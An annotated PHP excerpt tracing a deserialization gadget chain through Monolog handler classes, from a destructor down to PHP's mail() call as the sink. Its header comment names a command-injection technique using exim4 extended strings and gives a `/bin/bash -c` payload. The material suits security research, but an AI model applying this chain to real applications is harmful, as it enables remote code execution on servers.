/*
    1. \Monolog\Handler\RollbarHandler(\Monolog\Handler\Handler)::__destruct
    2. \Monolog\Handler\RollbarHandler::close
    3. \Monolog\Handler\RollbarHandler::flush
    4. \Monolog\Handler\BufferHandler::flush
    5. \Monolog\Handler\NativeMailerHandler(\Monolog\Handler\MailHandler)::handleBatch
    6. \Monolog\Handler\NativeMailerHandler::send
    7. mail
    // perform a command injection on mail() and use exim4 extended strings, 
    // the payload is `/bin/bash -c "$command"` (on debian based distribution (exim4 MTA))
*/

// vendor/monolog/monolog/src/Monolog/Handler/RollbarHandler.php
namespace Monolog\Handler;
class RollbarHandler extends AbstractProcessingHandler {
}

// vendor/monolog/monolog/src/Monolog/Handler/AbstractProcessingHandler.php
namespace Monolog\Handler;
abstract class AbstractProcessingHandler extends AbstractHandler implements ProcessableHandlerInterface, FormattableHandlerInterface {
}

// vendor/monolog/monolog/src/Monolog/Handler/AbstractHandler.php
namespace Monolog\Handler;
abstract class AbstractHandler extends Handler implements ResettableInterface {
}

// vendor/monolog/monolog/src/Monolog/Handler/Handler.php
namespace Monolog\Handler;
abstract class Handler implements HandlerInterface {
    public function __destruct() {
        try {
            $this->close(); // [*] next
        } catch (\Throwable $e) {
            // do nothing
        }
    }
}

// vendor/monolog/monolog/src/Monolog/Handler/RollbarHandler.php
namespace Monolog\Handler;
class RollbarHandler extends AbstractProcessingHandler {
    public function close(): void {
        $this->flush();
    }
    
    public function flush(): void {
        if ($this->hasRecords) {
            $this->rollbarLogger->flush();
            $this->hasRecords = false;
        }
    }
}

// vendor/monolog/monolog/src/Monolog/Handler/BufferHandler.php
namespace Monolog\Handler;
class BufferHandler extends AbstractHandler implements ProcessableHandlerInterface, FormattableHandlerInterface {
    public function flush(): void {
        if ($this->bufferSize === 0) {
            return;
        }

        $this->handler->handleBatch($this->buffer); // [*] next
        $this->clear();
    }
}

// vendor/monolog/monolog/src/Monolog/Handler/NativeMailerHandler.php
namespace Monolog\Handler;
class NativeMailerHandler extends MailHandler {
}

// vendor/monolog/monolog/src/Monolog/Handler/MailHandler.php
namespace Monolog\Handler;
abstract class MailHandler extends AbstractProcessingHandler {
    public function handleBatch(array $records): void {
        $messages = [];

        foreach ($records as $record) {
            if ($record['level'] < $this->level) {
                continue;
            }
            $messages[] = $this->processRecord($record);
        }

        if (!empty($messages)) {
            $this->send((string) $this->getFormatter()->formatBatch($messages), $messages); // [*] next
        }
    }
}

// vendor/monolog/monolog/src/Monolog/Handler/NativeMailerHandler.php
namespace Monolog\Handler;
class NativeMailerHandler extends MailHandler {
    protected function send(string $content, array $records): void {
        $contentType = $this->getContentType() ?: ($this->isHtmlBody($content) ? 'text/html' : 'text/plain');

        if ($contentType !== 'text/html') {
            $content = wordwrap($content, $this->maxColumnWidth);
        }

        $headers = ltrim(implode("\r\n", $this->headers) . "\r\n", "\r\n");
        $headers .= 'Content-type: ' . $contentType . '; charset=' . $this->getEncoding() . "\r\n";
        if ($contentType === 'text/html' && false === strpos($headers, 'MIME-Version:')) {
            $headers .= 'MIME-Version: 1.0' . "\r\n";
        }

        $subject = $this->subject;
        if ($records) {
            $subjectFormatter = new LineFormatter($this->subject);
            $subject = $subjectFormatter->format($this->getHighestRecord($records));
        }

        $parameters = implode(' ', $this->parameters);
        foreach ($this->to as $to) {
            mail($to, $subject, $content, $headers, $parameters); // [*] sink
        }
    }
}